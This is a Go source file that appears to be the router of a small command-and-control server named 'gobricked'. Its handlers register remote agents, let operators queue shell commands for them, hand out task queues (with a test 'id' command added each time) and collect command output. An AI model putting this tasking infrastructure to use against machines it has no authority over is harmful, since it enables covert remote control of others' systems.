package router

import (
	"encoding/json"
	"fmt"
	"gobricked/pkg/util"
	"log"
	"net/http"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
)

func RegisterAgentHandler(w http.ResponseWriter, r *http.Request) {
	var agent util.Agent
	if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	agentID := uuid.New().String()
	agent.ID = agentID
	agent.LastSeen = time.Now()

	util.Agents[agentID] = agent

	log.Printf("[+] Registered agent %s (%s) from (%s)\n", agentID, agent.Hostname, agent.IP)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agent)
}

// pulls agent tasks from the global Tasks hashmap using agent ID
func GetTasksHandler(w http.ResponseWriter, r *http.Request) {
	agentID := mux.Vars(r)["agentID"]

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	agentTasks := util.Tasks[agentID]
	// TESTING
	exampleTask := util.Task{
		ID:      "task-01",
		Command: "id",
	}
	agentTasks = append(agentTasks, exampleTask)
	//*

	// clear task queue for agent
	util.Tasks[agentID] = []util.Task{}

	log.Printf("[>] Agent (%s) pulled (%d) task(s)", agentID, len(agentTasks))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agentTasks)
}

// for the operators to queue tasks to agents
func PostTaskHandler(w http.ResponseWriter, r *http.Request) {
	var task struct {
		AgentID string `json:"agent_id"`
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
		http.Error(w, "Invalid task", http.StatusBadRequest)
		return
	}

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	newTask := util.Task{
		ID:      uuid.New().String(),
		Command: task.Command,
	}
	util.Tasks[task.AgentID] = append(util.Tasks[task.AgentID], newTask)

	log.Printf("[*] Added task %s to agent %s", newTask.ID, task.AgentID)
	w.WriteHeader(http.StatusCreated)
}

func PostResultHandler(w http.ResponseWriter, r *http.Request) {
	var result util.Result
	err := json.NewDecoder(r.Body).Decode(&result)

	if err != nil {
		log.Printf("Decode error: %v\n", err)
		http.Error(w, "Invalid result", http.StatusBadRequest)
		return
	}
	fmt.Println(result)

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	util.Results = append(util.Results, result)
	log.Printf("[✓] Received result for task (%s) from agent (%s) > %s", result.TaskID, result.AgentID, result.Output)
	w.WriteHeader(http.StatusCreated)
}

func GetResultHandler(w http.ResponseWriter, r *http.Request) {

}
